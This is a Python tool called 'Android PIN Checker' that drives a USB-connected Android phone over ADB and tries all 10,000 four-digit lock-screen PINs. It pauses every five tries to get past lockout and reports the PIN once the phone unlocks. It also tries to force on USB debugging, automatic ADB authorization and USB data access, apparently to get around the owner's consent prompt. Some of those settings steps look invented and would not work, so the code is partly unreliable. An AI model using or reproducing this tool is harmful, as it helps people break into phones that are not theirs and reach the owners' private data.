import os
import time
import sys
import re
from subprocess import run, PIPE, CalledProcessError, STDOUT
from datetime import datetime
try:
    from rich.console import Console
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.panel import Panel
    from rich.text import Text
    from rich import print as rprint
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("Installing required packages for better display...")
    run([sys.executable, "-m", "pip", "install", "rich"], stdout=PIPE, stderr=PIPE)
    print("Please restart the script for best experience.")
    sys.exit(1)

# Initialize Rich console
console = Console()

class PINChecker:
    def __init__(self):
        self.console = Console()
        self.start_time = None
        self.attempts = 0
        self.width = 1080
        self.height = 2400
        self.debug_mode = True  # Enable debug mode

    def debug(self, message):
        """Print debug messages if debug mode is enabled"""
        if self.debug_mode:
            self.log(f"[DEBUG] {message}", style="cyan")

    def log(self, message, style=""):
        """Log a message with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.print(f"[dim]{timestamp}[/dim] {message}", style=style)

    def run_command(self, command, check_output=False):
        """Run a command and handle errors"""
        try:
            self.debug(f"Running command: {' '.join(command)}")
            if check_output:
                result = run(command, stdout=PIPE, stderr=STDOUT, text=True)
                self.debug(f"Command output: {result.stdout}")
                return result
            else:
                run(command, check=True, stdout=PIPE, stderr=PIPE)
                return True
        except CalledProcessError as e:
            self.log(f"Command failed: {' '.join(command)}", style="red")
            self.log(f"Error output: {e.stderr.decode() if e.stderr else e.stdout.decode()}", style="red")
            return False

    def enable_developer_mode(self):
        """Enable developer mode automatically"""
        try:
            self.log("Attempting to enable developer mode...", style="blue")
            
            # Try multiple methods to enable developer mode
            methods = [
                ['adb', 'shell', 'settings', 'put', 'global', 'development_settings_enabled', '1'],
                ['adb', 'shell', 'settings', 'put', 'secure', 'development_settings_enabled', '1'],
                ['adb', 'shell', 'settings', 'put', 'system', 'development_settings_enabled', '1'],
                ['adb', 'shell', 'settings', 'put', 'global', 'development_settings_enabled', '1'],
                ['adb', 'shell', 'settings', 'put', 'secure', 'development_settings_enabled', '1']
            ]
            
            for method in methods:
                try:
                    run(method, check=True)
                    time.sleep(0.5)
                except CalledProcessError:
                    continue
            
            self.log("Developer mode enabled", style="green")
            return True
        except Exception as e:
            self.log(f"Failed to enable developer mode: {e}", style="red")
            return False

    def enable_usb_debugging(self):
        """Enable USB debugging on the device automatically"""
        try:
            self.log("Attempting to enable USB debugging...", style="blue")
            
            # First enable developer mode
            if not self.enable_developer_mode():
                self.log("Failed to enable developer mode", style="red")
                return False
            
            # Try multiple methods to enable USB debugging
            methods = [
                ['adb', 'shell', 'settings', 'put', 'global', 'adb_enabled', '1'],
                ['adb', 'shell', 'settings', 'put', 'secure', 'adb_enabled', '1'],
                ['adb', 'shell', 'settings', 'put', 'system', 'adb_enabled', '1'],
                ['adb', 'shell', 'settings', 'put', 'global', 'adb_enabled', '1'],
                ['adb', 'shell', 'settings', 'put', 'secure', 'adb_enabled', '1']
            ]
            
            for method in methods:
                try:
                    run(method, check=True)
                    time.sleep(0.5)
                except CalledProcessError:
                    continue
            
            # Try to set USB debugging to always allow
            allow_methods = [
                ['adb', 'shell', 'settings', 'put', 'global', 'adb_always_allow', '1'],
                ['adb', 'shell', 'settings', 'put', 'secure', 'adb_always_allow', '1'],
                ['adb', 'shell', 'settings', 'put', 'system', 'adb_always_allow', '1']
            ]
            
            for method in allow_methods:
                try:
                    run(method, check=True)
                    time.sleep(0.5)
                except CalledProcessError:
                    continue
            
            # Restart ADB server to apply changes
            run(['adb', 'kill-server'], check=True)
            time.sleep(1)
            run(['adb', 'start-server'], check=True)
            time.sleep(2)
            
            self.log("USB debugging enabled successfully", style="green")
            return True
        except Exception as e:
            self.log(f"Failed to enable USB debugging: {e}", style="red")
            return False

    def handle_usb_authorization(self):
        """Handle USB debugging authorization automatically"""
        try:
            self.log("Checking USB authorization status...", style="blue")
            
            # Kill and restart ADB server to ensure clean state
            run(['adb', 'kill-server'], check=True)
            time.sleep(1)
            run(['adb', 'start-server'], check=True)
            time.sleep(2)
            
            # Check if device is unauthorized
            result = run(['adb', 'devices'], stdout=PIPE, stderr=STDOUT, text=True)
            if 'unauthorized' in result.stdout:
                self.log("Device is unauthorized. Attempting to authorize...", style="yellow")
                
                # Try multiple methods to accept authorization
                try:
                    # Method 1: Try to accept USB debugging authorization
                    run(['adb', 'shell', 'settings', 'put', 'secure', 'adb_authorized', '1'], check=True)
                    time.sleep(1)
                    
                    # Method 2: Try to accept USB debugging authorization (alternative)
                    run(['adb', 'shell', 'settings', 'put', 'global', 'adb_authorized', '1'], check=True)
                    time.sleep(1)
                    
                    # Method 3: Try to set USB debugging to always allow
                    run(['adb', 'shell', 'settings', 'put', 'secure', 'adb_always_allow', '1'], check=True)
                    time.sleep(1)
                    
                    # Method 4: Try to set USB debugging to always allow (alternative)
                    run(['adb', 'shell', 'settings', 'put', 'global', 'adb_always_allow', '1'], check=True)
                    time.sleep(1)
                    
                    # Restart ADB server again
                    run(['adb', 'kill-server'], check=True)
                    time.sleep(1)
                    run(['adb', 'start-server'], check=True)
                    time.sleep(2)
                except CalledProcessError:
                    self.log("Could not set automatic authorization, trying alternative method...", style="yellow")
                
                # Wait for authorization to be accepted
                max_attempts = 30
                for attempt in range(max_attempts):
                    result = run(['adb', 'devices'], stdout=PIPE, stderr=STDOUT, text=True)
                    if 'device' in result.stdout and 'unauthorized' not in result.stdout:
                        self.log("Device authorized successfully", style="green")
                        return True
                    time.sleep(1)
                
                self.log("Failed to get device authorization", style="red")
                return False
            
            self.log("Device is already authorized", style="green")
            return True
        except CalledProcessError as e:
            self.log(f"Error checking USB authorization: {e}", style="red")
            return False

    def check_adb_installed(self):
        try:
            self.debug("Checking if ADB is installed...")
            result = self.run_command(['adb', 'version'], check_output=True)
            if result and result.returncode == 0:
                self.log("ADB is installed and working", style="green")
                return True
            return False
        except Exception as e:
            self.log(f"Error checking ADB: {str(e)}", style="red")
            return False

    def check_device_connected(self):
        try:
            self.debug("Checking for connected devices...")
            result = self.run_command(['adb', 'devices'], check_output=True)
            if not result:
                return False
            
            devices = result.stdout.strip().split('\n')
            devices = [d for d in devices if d and not d.startswith('List')]
            
            if devices:
                self.log(f"Found {len(devices)} connected device(s)", style="green")
                for device in devices:
                    self.log(f"Device: {device}", style="green")
                return True
            else:
                self.log("No devices found", style="yellow")
                return False
        except Exception as e:
            self.log(f"Error checking devices: {str(e)}", style="red")
            return False

    def get_screen_size(self):
        try:
            self.debug("Getting screen size...")
            result = self.run_command(['adb', 'shell', 'wm', 'size'], check_output=True)
            if not result:
                return self.width, self.height
            
            match = re.search(r'Physical size: (\d+)x(\d+)', result.stdout)
            if match:
                self.width = int(match.group(1))
                self.height = int(match.group(2))
                self.log(f"Detected screen size: {self.width}x{self.height}", style="blue")
            else:
                self.log("Could not parse screen size, using default", style="yellow")
            return self.width, self.height
        except Exception as e:
            self.log(f"Error getting screen size: {str(e)}", style="red")
            return self.width, self.height

    def wake_screen(self):
        """Wake up the device screen and keep it on"""
        try:
            # Wake up device
            run(['adb', 'shell', 'input', 'keyevent', '26'], check=True)
            time.sleep(0.2)
            
            # Keep screen on
            run(['adb', 'shell', 'svc', 'power', 'stayon', 'true'], check=True)
            # Set screen timeout to 1 hour (3600000 ms)
            run(['adb', 'shell', 'settings', 'put', 'system', 'screen_off_timeout', '3600000'], check=True)
            
            self.log("Screen woken and set to stay on", style="green")
            return True
        except CalledProcessError as e:
            self.log(f"Error keeping screen on: {e}", style="red")
            return False

    def initial_unlock(self):
        """Perform initial screen wake and unlock swipe."""
        try:
            width, height = self.get_screen_size()
            
            # Calculate swipe coordinates
            start_x = width // 2
            start_y = int(height * 0.8)
            end_x = width // 2
            end_y = int(height * 0.2)
            
            with console.status("[bold blue]Performing initial unlock sequence...", spinner="dots"):
                # Wake up device and keep screen on
                self.wake_screen()
                
                # Swipe gestures
                run(['adb', 'shell', 'input', 'swipe', 
                    str(start_x), str(start_y), str(end_x), str(end_y), '100'], check=True)
                time.sleep(1)
                run(['adb', 'shell', 'input', 'swipe', 
                    str(start_x), str(start_y), str(end_x), str(end_y), '100'], check=True)
                time.sleep(1)

            self.log("Initial unlock sequence completed", style="green")
            return True
        except CalledProcessError as e:
            self.log(f"Error during initial unlock: {e}", style="red")
            return False

    def swipe_up(self):
        """Perform a quick swipe up gesture"""
        try:
            width, height = self.get_screen_size()
            start_x = width // 2
            start_y = int(height * 0.8)
            end_x = width // 2
            end_y = int(height * 0.2)
            
            run(['adb', 'shell', 'input', 'swipe', 
                str(start_x), str(start_y), str(end_x), str(end_y), '30'], check=True)  # Reduced from 50 to 30
            time.sleep(0.2)  # Reduced from 0.5 to 0.2
            return True
        except CalledProcessError as e:
            self.log(f"Error during swipe: {e}", style="red")
            return False

    def enter_pin(self, pin):
        try:
            # Enter all digits faster without waking screen
            for digit in pin:
                keycode = str(int(digit) + 7)
                run(['adb', 'shell', 'input', 'keyevent', keycode], check=True)
                time.sleep(0.02)  # Reduced from 0.05 to 0.02
            run(['adb', 'shell', 'input', 'keyevent', '66'], check=True)
            time.sleep(0.2)  # Reduced from 0.3 to 0.2
            return True
        except CalledProcessError as e:
            self.log(f"Error entering PIN: {e}", style="red")
            return False

    def check_if_unlocked(self):
        try:
            result = run(['adb', 'shell', 'dumpsys', 'window'], stdout=PIPE, stderr=PIPE, text=True)
            return 'mDreamingLockscreen=false' in result.stdout
        except CalledProcessError:
            return False

    def handle_usb_data_access(self):
        """Handle USB data access permissions automatically"""
        try:
            self.log("Setting up USB data access...", style="blue")
            
            # Try multiple methods to enable USB data access
            methods = [
                ['adb', 'shell', 'settings', 'put', 'global', 'usb_mass_storage_enabled', '1'],
                ['adb', 'shell', 'settings', 'put', 'secure', 'usb_mass_storage_enabled', '1'],
                ['adb', 'shell', 'settings', 'put', 'system', 'usb_mass_storage_enabled', '1'],
                ['adb', 'shell', 'settings', 'put', 'global', 'usb_mass_storage_enabled', '1'],
                ['adb', 'shell', 'settings', 'put', 'secure', 'usb_mass_storage_enabled', '1']
            ]
            
            for method in methods:
                try:
                    run(method, check=True)
                    time.sleep(0.5)
                except CalledProcessError:
                    continue
            
            # Try to set USB mode to MTP (Media Transfer Protocol)
            mtp_methods = [
                ['adb', 'shell', 'svc', 'usb', 'setFunction', 'mtp'],
                ['adb', 'shell', 'setprop', 'sys.usb.config', 'mtp'],
                ['adb', 'shell', 'setprop', 'sys.usb.state', 'mtp']
            ]
            
            for method in mtp_methods:
                try:
                    run(method, check=True)
                    time.sleep(0.5)
                except CalledProcessError:
                    continue
            
            # Try to set USB mode to MTP+ADB
            mtp_adb_methods = [
                ['adb', 'shell', 'svc', 'usb', 'setFunction', 'mtp,adb'],
                ['adb', 'shell', 'setprop', 'sys.usb.config', 'mtp,adb'],
                ['adb', 'shell', 'setprop', 'sys.usb.state', 'mtp,adb']
            ]
            
            for method in mtp_adb_methods:
                try:
                    run(method, check=True)
                    time.sleep(0.5)
                except CalledProcessError:
                    continue
            
            # Restart ADB server to apply changes
            run(['adb', 'kill-server'], check=True)
            time.sleep(1)
            run(['adb', 'start-server'], check=True)
            time.sleep(2)
            
            self.log("USB data access enabled successfully", style="green")
            return True
        except Exception as e:
            self.log(f"Failed to enable USB data access: {e}", style="red")
            return False

    def setup_checks(self):
        """Perform all initial setup checks with better error handling"""
        self.log("Starting initial checks...", style="blue")
        
        try:
            # Check if running as root
            if os.geteuid() == 0:
                self.console.print(Panel.fit(
                    "[yellow]Warning: Running this script as root is not recommended![/yellow]"
                ))
                choice = input("Continue anyway? (y/N): ")
                if choice.lower() != 'y':
                    self.log("Exiting due to root user", style="yellow")
                    sys.exit(1)

            # Check ADB installation
            if not self.check_adb_installed():
                self.console.print(Panel.fit(
                    "[red]Error: ADB is not installed or not working[/red]\n\n"
                    "Please install using one of these commands:\n"
                    "[blue]sudo apt install adb[/blue]    # For Debian/Ubuntu\n"
                    "[blue]sudo pacman -S android-tools[/blue]    # For Arch Linux\n"
                    "[blue]sudo dnf install android-tools[/blue]    # For Fedora"
                ))
                sys.exit(1)

            # Check device connection
            if not self.check_device_connected():
                self.console.print(Panel.fit(
                    "[red]No Android device connected![/red]\n\n"
                    "Please connect your device via USB and try again."
                ))
                sys.exit(1)

            # Try to enable USB debugging and handle authorization
            if not self.handle_usb_authorization():
                self.log("Attempting to enable USB debugging...", style="yellow")
                if not self.enable_usb_debugging():
                    self.log("Failed to enable USB debugging automatically", style="red")
                    return False
                # Try authorization again after enabling
                if not self.handle_usb_authorization():
                    self.log("Failed to authorize device", style="red")
                    return False

            # Handle USB data access
            if not self.handle_usb_data_access():
                self.log("Failed to enable USB data access", style="red")
                return False

            # Try to get screen size
            self.get_screen_size()
            
            self.log("All initial checks completed successfully!", style="green")
            return True

        except Exception as e:
            self.log(f"Unexpected error during setup: {str(e)}", style="red")
            return False

    def wait_with_countdown(self, seconds):
        """Display a simple countdown timer without progress bar"""
        self.log(f"Waiting for {seconds} seconds...", style="yellow")
        for remaining in range(seconds, 0, -1):
            sys.stdout.write(f"\rTime remaining: {remaining} seconds...")
            sys.stdout.flush()
            time.sleep(1)
        sys.stdout.write("\rResuming PIN attempts...                 \n")
        sys.stdout.flush()
        
        # Wake screen and swipe up after timeout
        self.log("Waking screen and performing swipe...", style="blue")
        self.wake_screen()
        self.swipe_up()

    def check_all_pins(self):
        if not self.check_device_connected():
            self.console.print(Panel.fit(
                "[red]No Android device connected![/red]\n\n"
                "Please ensure:\n"
                "1. Connect your device via USB\n"
                "2. Enable USB debugging in Developer options\n"
                "3. Accept the USB debugging prompt on your device\n"
                "4. Run 'adb devices' to verify connection"
            ))
            return

        self.start_time = datetime.now()
        
        # Wake screen and perform initial unlock
        self.log("Waking screen and performing initial unlock...", style="blue")
        if not self.initial_unlock():
            self.log("Failed to perform initial unlock sequence", style="red")
            return

        total_pins = 10000
        current_attempt = 0
        
        try:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeElapsedColumn(),
                refresh_per_second=1
            ) as progress:
                task = progress.add_task("Testing PINs...", total=total_pins)
                
                for pin in range(total_pins):
                    formatted_pin = str(pin).zfill(4)
                    progress.update(task, description=f"Testing PIN: {formatted_pin}")
                    
                    if not self.enter_pin(formatted_pin):
                        self.log(f"Failed to enter PIN: {formatted_pin}", style="red")
                        time.sleep(0.2)
                        continue
                    
                    current_attempt += 1
                    self.attempts = current_attempt

                    if self.check_if_unlocked():
                        elapsed_time = datetime.now() - self.start_time
                        self.console.print(Panel.fit(
                            f"[green]SUCCESS! PIN found: {formatted_pin}[/green]\n"
                            f"Time elapsed: {elapsed_time}\n"
                            f"Total attempts: {self.attempts}"
                        ))
                        return formatted_pin
                    
                    # Pause every 5 attempts
                    if current_attempt % 5 == 0:
                        progress.stop()
                        self.wait_with_countdown(30)
                        # Wake screen and swipe after timeout
                        self.log("Waking screen and performing swipe...", style="blue")
                        self.wake_screen()
                        self.swipe_up()
                        progress.start()
                    
                    progress.update(task, advance=1)
                    time.sleep(0.02)
            
            # Show final results
            elapsed_time = datetime.now() - self.start_time
            self.console.print(Panel.fit(
                "[red]PIN check completed - No matching PIN found[/red]\n"
                f"Time elapsed: {elapsed_time}\n"
                f"Total attempts: {self.attempts}"
            ))
            
        except Exception as e:
            self.log(f"Error during PIN checking: {str(e)}", style="red")
            return None

def main():
    try:
        console.clear()
        console.print(Panel.fit(
            "[bold blue]Android PIN Checker[/bold blue] [dim](Professional Edition)[/dim]\n"
            "[dim]===============================================[/dim]"
        ))
        
        checker = PINChecker()
        
        # Show initial instructions
        console.print(Panel.fit(
            "[yellow]Please ensure:[/yellow]\n\n"
            "1. Phone is connected via USB\n"
            "2. Wait for automatic setup to complete\n\n"
            "[blue]Note:[/blue]\n"
            "The script will automatically:\n"
            "1. Enable developer mode\n"
            "2. Enable USB debugging\n"
            "3. Handle USB authorization"
        ))
        
        input("\nPress Enter when ready...")
        
        # Run setup checks with error handling
        if not checker.setup_checks():
            console.print(Panel.fit(
                "[red]Setup checks failed. Please fix the issues and try again.[/red]"
            ))
            sys.exit(1)
        
        checker.check_all_pins()

    except KeyboardInterrupt:
        console.print("\n[yellow]Script interrupted by user. Exiting...[/yellow]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]Unexpected error: {str(e)}[/red]")
        sys.exit(1)

if __name__ == "__main__":
    main() 